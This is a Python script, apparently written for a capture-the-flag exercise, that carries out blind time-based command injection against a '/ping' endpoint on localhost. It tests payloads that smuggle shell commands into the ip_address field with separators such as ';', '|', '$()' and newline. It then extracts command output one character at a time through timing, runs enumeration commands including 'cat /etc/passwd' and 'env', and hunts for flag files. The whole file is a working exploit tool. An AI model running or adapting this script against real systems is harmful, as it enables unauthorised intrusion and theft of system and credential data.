import requests
import time
import base64
import string
import urllib.parse

# Configuration
TARGET_URL = "http://127.0.0.1:32817/ping"
TIMEOUT_THRESHOLD = 4  # seconds - payloads should take 5+ seconds if successful
CHARSET = string.ascii_letters + string.digits + string.punctuation + string.whitespace

def send_payload(payload):
    """Send payload to target and return response time"""
    try:
        start_time = time.time()
        response = requests.post(
            TARGET_URL,
            data={"ip_address": payload},
            timeout=10
        )
        end_time = time.time()
        return end_time - start_time, response.status_code
    except requests.RequestException as e:
        print(f"[-] Request error: {e}")
        return 0, 0

def test_injection_techniques():
    """Systematically test different command injection techniques"""
    print("="*70)
    print("TESTING COMMAND INJECTION TECHNIQUES")
    print("="*70)
    
    # Define test patterns from the playbook
    techniques = [
        ("newline", "127.0.0.1%0asleep 5%0a"),
        ("semicolon", "127.0.0.1;sleep 5"),
        ("pipe", "127.0.0.1|sleep 5"),
        ("or_operator", "127.0.0.1||sleep 5"),
        ("and_operator", "127.0.0.1&&sleep 5"),
        ("subshell", "127.0.0.1$(sleep 5)"),
        ("backtick", "127.0.0.1`sleep 5`"),
        ("newline_encoded", "127.0.0.1%0asleep%205%0a"),
        ("multiple_commands", "127.0.0.1%3Bsleep+5"),
        ("pipe_encoded", "127.0.0.1%7Csleep+5"),
        ("double_pipe_encoded", "127.0.0.1%7C%7Csleep+5"),
    ]
    
    working_techniques = []
    
    for name, payload in techniques:
        print(f"\n[+] Testing technique: {name}")
        print(f"[+] Payload: {payload}")
        
        response_time, status_code = send_payload(payload)
        print(f"[+] Response time: {response_time:.2f}s | Status: {status_code}")
        
        if response_time >= TIMEOUT_THRESHOLD:
            print(f"[!] SUCCESS! Technique '{name}' works!")
            working_techniques.append((name, payload))
        else:
            print(f"[-] Failed - response too fast")
    
    return working_techniques

def extract_output_char_by_char(command, max_length=50):
    """
    Extract command output character by character using blind injection
    Uses base64 encoding to handle special characters safely
    """
    print(f"\n[+] Extracting output for command: {command}")
    
    extracted = ""
    
    for position in range(1, max_length + 1):
        char_found = False
        
        for char in CHARSET:
            # Base64 encode the command output for safe extraction
            b64_char = base64.b64encode(char.encode()).decode()
            
            # Use working technique: newline separator with base64 encoding
            payload = "127.0.0.1%0a"
            payload += f"test=$(echo $({command} | head -1 | cut -c{position}-{position} | base64))%0a"
            payload += f"if [ \"$test\" = \"{b64_char}\" ]; then sleep 5; fi%0a"
            
            response_time, _ = send_payload(payload)
            
            if response_time >= TIMEOUT_THRESHOLD:
                extracted += char
                print(f"[+] Character {position}: '{char}' (b64: {b64_char})")
                char_found = True
                break
        
        if not char_found:
            # No character found at this position, likely end of output
            break
    
    print(f"[+] Raw extracted data: {repr(extracted)}")
    
    try:
        # If it looks like base64, try to decode
        if len(extracted) > 0:
            decoded = base64.b64decode(extracted).decode('utf-8', errors='ignore')
            print(f"[+] Decoded output: {decoded}")
            return decoded
    except:
        pass
    
    return extracted

def enumerate_system():
    """Enumerate system using command injection"""
    results = {}
    
    print("\n" + "="*70)
    print("SYSTEM ENUMERATION")
    print("="*70)
    
    commands_to_test = [
        "whoami",
        "id",
        "uname -a",
        "pwd",
        "ls -la / | head -20",
        "ls -la /home 2>/dev/null",
        "cat /etc/passwd 2>/dev/null",
        "env | head -20",
        "ls -la . 2>/dev/null"
    ]
    
    for cmd in commands_to_test:
        print(f"\n[+] Executing: {cmd}")
        output = extract_output_char_by_char(cmd, max_length=100)
        results[cmd] = output
        print(f"[+] Result: {output[:80]}{'...' if len(output) > 80 else ''}")
    
    return results

def find_and_extract_flags():
    """Find and extract flag files"""
    print("\n" + "="*70)
    print("SEARCHING FOR FLAG FILES")
    print("="*70)
    
    # First, find flag files
    print("\n[+] Searching for files with 'flag' in name...")
    find_cmd = "find / -type f -iname '*flag*' 2>/dev/null | head -5"
    flag_paths_output = extract_output_char_by_char(find_cmd, max_length=200)
    
    if not flag_paths_output or "flag" not in flag_paths_output.lower():
        print("[-] No flag files found")
        return None
    
    print(f"[+] Flag files found: {flag_paths_output}")
    
    # Parse flag paths (might be multiple lines)
    flag_paths = []
    for line in flag_paths_output.split('\n'):
        line = line.strip()
        if line and ('/' in line) and len(line) > 5:
            flag_paths.append(line)
    
    print(f"[+] Parsed flag paths: {flag_paths}")
    
    # Extract contents of each flag file
    for flag_path in flag_paths:
        print(f"\n[+] Attempting to extract flag from: {flag_path}")
        
        # Use base64 encoding to safely extract file content
        cat_cmd = f"cat {flag_path} 2>/dev/null | base64 -w 0"
        b64_content = extract_output_char_by_char(cat_cmd, max_length=300)
        
        if b64_content:
            try:
                # Decode base64 to get actual flag content
                flag_content = base64.b64decode(b64_content).decode('utf-8', errors='ignore')
                print(f"[+] Flag content: {flag_content}")
                
                # Look for FLAG{ pattern
                if "FLAG{" in flag_content:
                    start = flag_content.find("FLAG{")
                    end = flag_content.find("}", start)
                    if end != -1:
                        flag = flag_content[start:end+1]
                        print(f"[!] FLAG DISCOVERED: {flag}")
                        return flag
            except Exception as e:
                print(f"[-] Error decoding flag file: {e}")
        else:
            print(f"[-] Could not extract content from {flag_path}")
    
    return None

def check_alternative_flag_locations():
    """Check common flag locations if find command doesn't work"""
    print("\n[+] Checking common flag locations...")
    
    common_locations = [
        "/flag",
        "/flag.txt",
        "/flag",
        "/root/flag.txt",
        "/home/*/flag.txt",
        "/app/flag.txt",
        "/tmp/flag.txt"
    ]
    
    for loc in common_locations:
        # Check if file exists first
        test_cmd = f"ls -la {loc} 2>&1 | wc -c"
        char_count = extract_output_char_by_char(test_cmd, max_length=10)
        
        if char_count and char_count.strip().isdigit() and int(char_count.strip()) > 0:
            print(f"[+] File exists at: {loc}")
            
            # Try to extract its content
            flag_content = extract_flag_from_known_location(loc)
            if flag_content:
                return flag_content
    
    return None

def extract_flag_from_known_location(path):
    """Extract flag from a known location"""
    print(f"\n[+] Extracting flag from known location: {path}")
    
    # First check if it's a file
    check_cmd = f"test -f {path} && echo 'IS_FILE'"
    result = extract_output_char_by_char(check_cmd, max_length=10)
    
    if "IS_FILE" in result:
        print(f"[+] Confirmed {path} is a file")
        
        # Extract content
        cat_cmd = f"cat {path} 2>/dev/null | base64 -w 0"
        b64_content = extract_output_char_by_char(cat_cmd, max_length=300)
        
        if b64_content:
            try:
                flag_content = base64.b64decode(b64_content).decode('utf-8', errors='ignore')
                print(f"[+] Content: {flag_content}")
                
                if "FLAG{" in flag_content:
                    start = flag_content.find("FLAG{")
                    end = flag_content.find("}", start)
                    if end != -1:
                        flag = flag_content[start:end+1]
                        print(f"[!] FLAG: {flag}")
                        return flag
            except Exception as e:
                print(f"[-] Error: {e}")
    
    return None

def main():
    """Main execution"""
    print("="*70)
    print("BLIND COMMAND INJECTION ENUMERATION SCRIPT")
    print(f"Target: {TARGET_URL}")
    print("="*70)
    
    # Step 1: Test injection techniques
    working_techniques = test_injection_techniques()
    
    if not working_techniques:
        print("\n[-] No working injection techniques found!")
        print("[-] The target might not be vulnerable or needs different techniques.")
        return None
    
    print(f"\n[!] Found {len(working_techniques)} working technique(s)")
    for name, payload in working_techniques:
        print(f"    - {name}: {payload}")
    
    # Step 2: Enumerate system
    results = enumerate_system()
    
    print("\n" + "="*70)
    print("ENUMERATION RESULTS SUMMARY")
    print("="*70)
    
    for cmd, output in results.items():
        print(f"\n[+] {cmd}:")
        lines = output.split('\n')
        for i, line in enumerate(lines[:5]):  # Show first 5 lines
            if line.strip():
                print(f"    {line}")
        if len(lines) > 5:
            print(f"    ... ({len(lines) - 5} more lines)")
    
    # Step 3: Find and extract flags
    flag = find_and_extract_flags()
    
    if not flag:
        # Try alternative locations
        flag = check_alternative_flag_locations()
    
    if flag:
        print(f"\n" + "="*70)
        print(f"[!] SUCCESS! FLAG FOUND: {flag}")
        print("="*70)
        return flag
    else:
        print(f"\n" + "="*70)
        print("[-] No flag found during enumeration")
        print("="*70)
    
    return None

if __name__ == "__main__":
    main()

